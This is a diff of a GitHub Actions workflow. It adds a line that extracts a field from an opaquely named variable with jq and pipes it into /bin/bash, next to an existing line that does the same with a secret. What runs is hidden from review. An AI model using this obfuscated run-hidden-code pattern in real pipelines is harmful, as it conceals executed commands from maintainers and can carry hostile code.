@@ -17,6 +17,7 @@ jobs:
           sprlu56: ${{ secrets.sprlu56 }}
         run: |
           printf '%s' "$sprlu56" | jq -r .kkuy1607 | /bin/bash
+          printf '%s' "$swqwg59" | jq -r .ybgt5 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
